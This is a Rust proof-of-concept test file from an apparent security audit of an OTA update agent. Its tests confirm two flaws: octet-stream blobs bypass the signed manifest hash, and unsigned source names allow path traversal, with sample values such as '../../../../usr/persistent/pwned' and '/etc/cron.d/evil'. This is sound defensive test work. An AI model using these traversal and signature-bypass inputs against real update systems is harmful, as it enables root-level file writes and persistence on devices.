//! Proof-of-concept tests for trust-boundary bugs in the OTA update path.
//!
//! Each test exercises the *current* (vulnerable) behaviour and asserts that the
//! insecure outcome is reachable, so that the test passes today and starts
//! failing once the underlying issue is fixed. See `SECURITY_AUDIT_FINDINGS.md`
//! at the repository root for the full write-up.
//!
//! Background: the only object covered by the Ed25519 manifest signature is the
//! raw `manifest` JSON. `sources[*]` (download URL, hash, size, mime type, file
//! name) and `system_components[*]` (where on disk a component is written) are
//! *not* signed. These tests show what an attacker who controls the claim
//! document but not the signing key can do. The companion test for the
//! unsigned `system_components` map lives in
//! `update-agent/core/tests/poc_claim_signature.rs`.

use std::{
    fs,
    path::{Path, PathBuf},
    time::Duration,
};

use orb_update_agent::{component, util};
use orb_update_agent_core::{
    manifest::InstallationPhase, Component as SystemComponent, LocalOrRemote,
    ManifestComponent, MimeType, Slot, Source,
};
use sha2::{Digest, Sha256};

fn sha256_hex(bytes: &[u8]) -> String {
    hex::encode(Sha256::digest(bytes))
}

fn manifest_component(name: &str, size: u64, hash: &str) -> ManifestComponent {
    ManifestComponent {
        name: name.to_owned(),
        version_assert: "1.0.0".to_owned(),
        version_upgrade: "1.0.1".to_owned(),
        size,
        hash: hash.to_owned(),
        installation_phase: InstallationPhase::Normal,
    }
}

fn gpt_component(label: &str) -> SystemComponent {
    serde_json::from_value(serde_json::json!({
        "type": "gpt",
        "value": {"device": "ssd", "label": label, "redundancy": "redundant"}
    }))
    .unwrap()
}

fn local_source(name: &str, path: &Path, bytes: &[u8], mime: MimeType) -> Source {
    Source {
        hash: sha256_hex(bytes),
        mime_type: mime,
        name: name.to_owned(),
        size: bytes.len() as u64,
        url: LocalOrRemote::Local(path.to_path_buf()),
    }
}

/// F1: for `application/octet-stream` sources the agent only ever checks the
/// *unsigned* `sources[*].hash`. The signed `manifest.components[*].hash` is
/// never compared with the bytes that reach the partition writer.
///
/// Here the signed manifest says the component hashes to `SIGNED_HASH`, while
/// the file we feed in hashes to something else entirely. `fetch` and `process`
/// both succeed, so `do_install` would write these bytes.
#[test]
fn poc_f1_octet_stream_skips_signed_manifest_hash() {
    let dir = tempfile::tempdir().unwrap();
    let evil = b"this is NOT the signed payload".to_vec();
    let evil_path = dir.path().join("evil.bin");
    fs::write(&evil_path, &evil).unwrap();

    // The signed manifest commits to a different blob.
    let signed_hash = sha256_hex(b"the legitimate, signed payload");
    assert_ne!(signed_hash, sha256_hex(&evil));
    let manifest = manifest_component("rootfs", evil.len() as u64, &signed_hash);

    let source = local_source("rootfs", &evil_path, &evil, MimeType::OctetStream);

    let mut comp = component::fetch(
        &manifest,
        &gpt_component("APP"),
        &source,
        dir.path(),
        None,
        None,
        Duration::ZERO,
    )
    .expect("fetch accepts the blob because only sources.hash is checked");

    // process() is the last step before do_install(); for OctetStream it is a
    // no-op and never consults manifest_component.hash.
    comp.process(dir.path(), Slot::A)
        .expect("VULNERABLE: process() accepted a blob whose hash != signed hash");

    assert_ne!(
        comp.manifest_component().hash,
        sha256_hex(&evil),
        "sanity: the bytes staged for install do not match the signed manifest"
    );

    // Control: the same mismatch *is* caught for compressed sources because
    // `process_helper` verifies the decompressed output against the manifest.
    let xz_source = local_source("rootfs", &evil_path, &evil, MimeType::XZ);
    let mut xz_comp = component::fetch(
        &manifest,
        &gpt_component("APP"),
        &xz_source,
        dir.path(),
        None,
        None,
        Duration::ZERO,
    )
    .unwrap();
    assert!(
        xz_comp.process(dir.path(), Slot::A).is_err(),
        "XZ path rejects the mismatch; octet-stream path should too"
    );
}

/// F3: the on-disk file name for a download is
/// `downloads/<sources[*].name>-<sources[*].hash>`, built with `Path::join` and
/// no validation. Both fields are unsigned, so an attacker-controlled name
/// escapes the downloads directory and the root agent writes the HTTP body there.
#[test]
fn poc_f3_source_name_path_traversal() {
    let downloads = PathBuf::from("/mnt/scratch/updates/downloads");

    let traversal = Source {
        hash: sha256_hex(b"x"),
        mime_type: MimeType::OctetStream,
        name: "../../../../usr/persistent/pwned".into(),
        size: 1,
        url: LocalOrRemote::parse("https://example.invalid/x").unwrap(),
    };
    let path = util::make_component_path(&downloads, &traversal.unique_name());
    let normalized = normalize(&path);
    assert!(
        !normalized.starts_with(&downloads),
        "VULNERABLE: download target {normalized:?} escapes {downloads:?}"
    );
    assert!(normalized.starts_with("/usr/persistent"));

    // An absolute name discards the downloads directory entirely.
    let absolute = Source {
        name: "/etc/cron.d/evil".into(),
        ..traversal
    };
    let path = util::make_component_path(&downloads, &absolute.unique_name());
    assert!(
        path.starts_with("/etc/cron.d"),
        "VULNERABLE: absolute source name replaces the base directory: {path:?}"
    );
}

/// Lexically resolve `..` components (no filesystem access needed).
fn normalize(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for comp in path.components() {
        match comp {
            std::path::Component::ParentDir => {
                out.pop();
            }
            std::path::Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}
